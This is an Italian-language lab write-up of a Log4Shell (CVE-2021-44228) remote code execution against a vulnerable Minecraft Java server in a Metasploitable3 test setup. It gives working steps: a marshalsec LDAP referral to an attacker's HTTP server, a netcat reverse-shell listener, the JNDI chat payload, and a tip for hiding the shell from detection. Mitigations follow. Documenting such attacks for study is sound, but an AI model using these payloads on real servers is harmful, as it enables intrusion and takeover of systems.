# Minecraft Server no-auth RCE
---
## Threat Model
*L'attaccante:*
- Riesce a comunicare con il server vulnerabile;
    * Ha a disposizione un account valido nel caso in cui il server richieda la verifica dell'account Microsoft.

- **(!) L'attaccante può ottenere il controllo completo del sistema senza autenticazione e senza alcuna partecipazione da parte della vittima.**
---
## Preambolo:  cos'è un server Minecraft?
Minecraft è un videogioco sandbox molto popolare della casa produttrice "Mojang" che da vari anni è stato acquisito da Microsoft. Il gioco offre due versioni differenti, la "Java Edition" scritta appunto in Java, e la "Bedrock Edition" una versione multi-piattaforma scritta in C++, un server della bedrock edition non supporta client Java e viceversa.
<br>Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.

## La vulnerabilità del server
**Log4j**: La vulnerabilità si basa sulla libreria Log4j che consente di gestire il logging dell'applicazione o dei servizi online offrendo anche la possibilità di comunicare con altri servizi sul sistema. Log4j offriva la possibilità di eseguire *lookup* risolvendo variabili tramite il protocollo JNDI (Java Name and Directory Interface), funzione abilitata di default nelle versioni critiche di Log4j.
Minecraft implementa questa libreria che sarà la causa della vulnerabilità, consentendo all'attaccante di eseguire codice malevolo da remoto senza autenticazione e senza che ci sia un operazione manuale da parte della vittima.

Dalla versione 1.7 fino alla 1.18 del gioco è stata trovata la vulnerabilità zero-day **CVE-2021-44228**, meglio nota come Log4Shell.
Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi, sostituendo direttamente la versione nella repository ufficiale per i client. 
Le patch sono automatiche nei confronti dei giocatori, non è quindi possibile effettuare questo attacco nei confronti dei client.

I server ufficiali sono chiamati "Vanilla", ossia senza modifiche del server stesso, tuttavia non sono in grado di prevenire l'abuso di cheat all'interno del gioco e non offrono funzionalità aggiuntive di sicurezza e personalizzazione. Per questo motivo sono stati creati dalla community, versioni di terze parti (es: Bukkit, Spigot, PaperMC) che consentono maggior sicurezza e l'installazione di plugins scritti in Java.

Il problema si pone infatti lato server, se l'host non effettua manualmente la patch del server in base alla versione di riferimento [(vedi nota Mojang/Microsoft)](#fontirisorse-esterne-citate), l'exploit potrebbe avere successo. I server terzi, al contrario di quelli Vanilla, tendono ad utilizzare delle tecniche di aggiornamento automatico (obbligatorio però il riavvio del server per la discovery delle patch) rendendo maggiormente più difficile l'attacco.
Per questo motivo (e per non appesantire eccessivamente il sistema) si è scelto l'utilizzo del server Vanilla 1.8.1 come server vittima.

## L'attacco *"in a nutshell"*
L'attacco parte dalla creazione di un server LDAP che sarà il punto di ingresso del traffico verso la vittima.
Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'iniezione.
Si scrive una classe Java che al suo interno contenga del codice malevolo come ad esempio la cancellazione di file, l'installazione di un ransomware ecc...

Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluta utilizzare una classe Java che ne consenta il Remote Code Execution tramite una reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.

**Injection**: La fase di iniezione consiste di inviare via chat di gioco, un messaggio così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il server inizi una connessione LDAP al server dell'attaccante.
Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP purché avente valido account Microsoft nel caso di server con verifica.

Una volta che la connessione LDAP è stabilita con l'attaccante, il server rigetterà la richiesta al server HTTP che userà la classe Java (precompilata) come response al server vittima.

Quest'ultimo ricevuta la classe la deserielizzerà eseguendone il codice, nel nostro caso come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server Netcat aprendo una reverse shell con l'attaccante.

A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante.

## Tool necessari per l'attacco
* **Server LDAP** si è utilizzata la classe Java `LDAPRefServer.java` nella sezione JNDI della repo GitHub [Marshalsec](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) contenente vari tool (gadget) inerenti *"all'insicurezza delle deserializzazioni"* di Java.

* **Classe Java** si è utilizzato e modificato il secondo esempio di reverse shell Java di [Reverse Shell Cheat Sheet](#fontirisorse-esterne-citate).

* **Maven**: Fondamentale per eseguire il packaging del progetto del server LDAP.

* **JDK 1.8.0_181**: È necessario l'utilizzo della stessa versione Java con cui il server Minecraft è compilato, altrimenti l'esecuzione della classe malevola sul server non funzionerebbe.
* **Python**: Per l'avvio di un server http che consenta l'invio della classe Java.
* **Netcat**: Per consentire la connessione TCP della vittima all'attaccante in modo da fornire una reverse shell.

## PoC
**Passaggi partici dell'attacco, a partire dalla preparazione dell'ambiente dell'attaccante fino all'iniezione dell'exploit.**

***Nota:*** *Nel nostro caso per l'attaccante si è utilizzata una macchina virtuale con sistema operativo Kali, mentre per il server vittima si è utilizzato direttamente la macchina pre-configurata Metasploitable3 per questioni di comodità. Tuttavia questa macchina è configurata in modo tale da essere facilmente penetrabile, in un contesto diverso queste operazioni potrebbero non essere le stesse (come meglio descritto nelle [conclusioni](#mitigazioni-e-conclusioni)).*

**1)** Scrittura classe Java e compilarla tramite "javac" con la stessa versione del server vulnerabile che darà in output un file .class essenziale per il server HTTP:
```console
javac <percorso>/NomeClasseJavaMalevola.jar
``` 
**2)** Compilazione con sovrascrittura del `.jar` del server LDAP con maven: 
```console
mvn clean package -DskipTests
``` 
**3)** Avvio del server LDAP tramite: 
```console
java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <http://indirizzo_attaccante_serverHTTP:[porta]>/#<NomeClasseJavaMalevola> [<porta>]
``` 
**4)** Avvio del server http sulla porta 8080 (default) tramite:
```console
python3 -m http.server <porta>
``` 
**5)** Avvio del server Netcat tramite:
```console
netcat -lnvp <porta>
``` 
![schermo_attaccante1](schermo_attaccante1.png)
**A questo punto l'ambiente dell'attaccante è pronto, è ora possibile l'inizio della fase di iniezione.**

***Nota:*** *Per l'iniezione non è necessario che sia sempre lo stesso attaccante/macchina ad eseguire questi passaggi, perciò per questioni di ottimizzazione e per non appesantire eccessivamente le macchine virtuali, l'iniezione verrà effettuata direttamente dalla macchina host, si è proceduto così all'apertura della porta 25565[<sup>1</sup>](#1-quasi-tutti-i-server-di-gioco-sono-impostati-con-la-porta-well-known-25565-se-non-diversamente-configurati-anche-nel-nostro-caso-si-è-proceduto-a-lasciare-la-porta-predefinita) di VirtualBox per consentire all'host di raggiungere il server vittima.*

1) Download ed installazione di Java per poter avviare il gioco, a contrario del server vittima e dell'ambiente dell'attaccante, non è necessaria la versione specifica vulnerabile.

2) Download di un launcher compatibile con il server, nel caso di server che richiedano l'autenticazione Microsoft si ha bisogno del launcher originale; in caso contrario anche l'utilizzo di launcher di terze parti senza licenza è sufficiente.

3) **Scelta della corretta versione di gioco**,la versione è fondamentale per la buona riuscita dell'exploit, le versioni critiche vanno dalla 1.7 alla 1.18, come anticipato nel nostro caso si userà la versione 1.8.1, l'importante è comunque utilizzare la corretta versione di Java.

4) Connessione al server di gioco e invio tramite chat di gioco del payload usando la semantica utile al nostro caso:
 ```shell
 {jndi:ldap://<IP ATTACCANTE>:<PORTA LDAP ATTACCANTE>/#<NomeClasseJava>}
 ```
## Problematiche e criticità riscontrate
***Nota:*** *Come anticipato il server in questione è stato direttamente hostato sulla macchina virtuale *Metasploitable3*, per cui il funzionamento dell'attacco e le relative criticità si riferiscono a questo ambiente ad eccezione di alcune problematiche che non hanno uno stretto contatto con l'ambiente ma sono di entità generica.*

---
 1. ${{\color{Goldenrod}{{\textbf{\textsf{Problematica:}}}}}}$ Inizialmente si è proceduto a compilare una classe Java per l'exploit utilizzando una versione predefinita installata nel sistema (nel nostro caso la versione "11.0"), tuttavia si è scoperto che l'exploit non andava a buon fine, interrompendo quindi l'attacco fino alla fase della connessione ed ottenimento da parte del server vittima della classe malevola.<br>
   ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Si è scoperto che nella file batch creato sul server per eseguirlo, (quindi non sulla console diretta), compariva un errore segnalante che la classe era stata compilata con una versione successiva e di conseguenza non poteva essere eseguita. Si è così provato a compilare la classe direttamente con la stessa versione che il server è stato compilato (ossia la JDK 1.8.0_181) ed a seguito di ulteriori tentavi si è riusciti a far eseguire la classe con successo.
---
2. ${{\color{Goldenrod}{{\textbf{\textsf{Problematica:}}}}}}$ Successivamente all'esecuzione dell'iniezione e collegamento tramite reverse-shell, specialmente nella fase di collegamento il server vittima poteva chiudersi inaspettatamente.<br>
    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Tramite i file di log presenti nella cartella del server si è analizzato l'errore: *`"A single server tick took 60.00 seconds (should be me max 0.05)"`*. Questo è dovuto al fatto che di default il server è configurato per avere un tempo (in tick di gioco) massimo di risposta di 60000 tick (60 millisecondi), essendo il tempo di risposta standard 20 tick. Poiché questo valore predefinito è troppo basso, non consente al server di mantenere la connessione al Netcat dell'attaccante. Si è proceduto così ad aumentare questo tempo e per fini pratici lo si è impostato a "-1" in modo da disattivarlo.[<sup>2</sup>](#2-questa-modifica-è-stata-effettuata-sul-file-serverproperties-contenente-la-configurazione-di-base-del-server-alla-riga-max-tick-time-si-è-sostituito-il-valore-in--1)

    ![server_crash_tick](server_crash_tick.png)

---
3. ${{\color{orangered}{{\textbf{\textsf{Criticità:}}}}}}$ A seguito della buona riuscita della connessione con questa tecnica di reverse-shell si è notato che il server rimane funzionale ma viene generato per i giocatori un lag/interruzione per entrare nel server.<br>
${{\color{yellowgreen}{{\textbf{\textsf{Possibile raggiro:}}}}}}$ Chiaramente questo non ha a che fare con la buona riuscita dell'attacco ma ha solo lo scopo di ridurre la tracciabilità dello stesso. Si può quindi, riscrivendo la classe Java, invece di eseguire direttamente una reverse shell sul server attaccato, la si può far scaricare anche tramite uno script powershell ed eseguirla in modalità nascosta senza impattare il server di gioco.
---
##### [1](#poc-e-problematiche-rilevate): Quasi tutti i server di gioco sono impostati con la porta *well-known* '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
##### [2](#problematiche-e-criticità-riscontrate): Questa modifica è stata effettuata sul file `server.properties` contenente la configurazione di base del server, alla riga `max-tick-time` si è sostituito il valore in '-1'.
---
# Mitigazioni e conclusioni
L'esecuzione di questo attacco non risulta eccessivamente ostica ma si necessita di server che in un contesto reale ad oggi difficilmente troverebbe applicazione date le patch rilasciate da Microsoft e la difficoltà di trovare, anche intenzionalmente, server vulnerabili in particolare in quelli terzi, che ricoprono quasi il totale utilizzo ad oggi.

C'è da considerare che l'ambiente utilizzato (Metasploitable3) è preconfigurato in modo tale da avere pochissime restrizioni in merito alla sicurezza, per cui in ambienti più sicuri questo attacco comporterebbe poca se non nulla applicazione.
Tuttavia sotto un punto di vista dell'***impatto***, se non si è interessati a prendere il controllo completo del pc o ad un esflitrazioni di dati, modificando opportunamente la classe Java si potrebbe arrecare comunque danni tramite la cancellazione di file sensibili o alla criptazione del disco con richiesta di riscatto ecc..

Già utilizzando una buona configurazione di un firewall si riuscirebbe a mitigare l'attacco, l'utilizzo di un EDR o antivirus potrebbe rilevare la backdoor se non opportunamente mascherata. 
Anche Windows, in particolare con le sue versioni più aggiornate, è in grado di rilevare l'esecuzione di script malevoli.

A partire da Java 8u121, la funzionalità JNDI richiede configurazioni specifiche per consentire lookups remote tramite il protocollo LDAP. Tuttavia, per impostazione predefinita, i lookups non sono disabilitati completamente, ma alcune funzionalità di rete sono più sicure e richiedono configurazioni esplicite.

Per le versioni versioni ufficiali critiche, terze del server e/o per versioni *moddate* da community minori, tramite il parametro `-Dlog4j2.formatMsgNoLookups=true` all'avvio del server, si può disabilitare completamente la funzionalità di lookup di log4j rendendo di conseguenza impossibile eseguire attacchi.
Il parametro varia a seconda della versione di gioco e in alcuni casi è necessario l'inserimento di altri file (vedasi fonti esterne -> Security Vulnerability in Minecraft)

Con la versione 2.15.0 di Log4j, la funzione di lookup è stata completamente rimossa, rendendo impossibile l'esecuzione dell'attacco per tutti i servizi che utilizzano tale versione (comprese le ultime versioni di Minecraft Server e Client).


---

### Fonti/risorse esterne citate
> * [Java Unmarshaller Security - Turning your data into code execution (~Moritz Bechler)](https://github.com/mbechler/marshalsec)

> * [Reverse Shell Cheat Sheet - Java Alternative 1 (~Internal All The Things)](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#java)

> * [Security Vulnerability In Minecraft: Java Edition (~Mojang/Microsoft)](https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition)

> * [NATIONAL VULNERABILITY DATABASE: CVE-2021-44228 [Log4Shell] (~NIST)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

> * [JDK 8, Update 121 Release Notes (~Java)](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)
